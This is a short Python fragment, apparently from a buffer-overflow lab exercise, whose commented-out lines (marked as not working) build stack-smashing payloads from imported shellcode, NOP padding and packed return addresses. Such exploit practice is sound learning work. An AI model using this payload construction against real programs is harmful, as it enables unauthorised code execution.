from shellcode import shellcode
from struct import pack


# didn't work

# ret =  0xbffef228
# sc =  0x8048f54

# print shellcode
#
# print shellcode + '\x90' *17 + pack("<I",sc) + pack("<I",ret)
#
# print "\xeb" + "\x06" + "\x90"*6 + shellcode
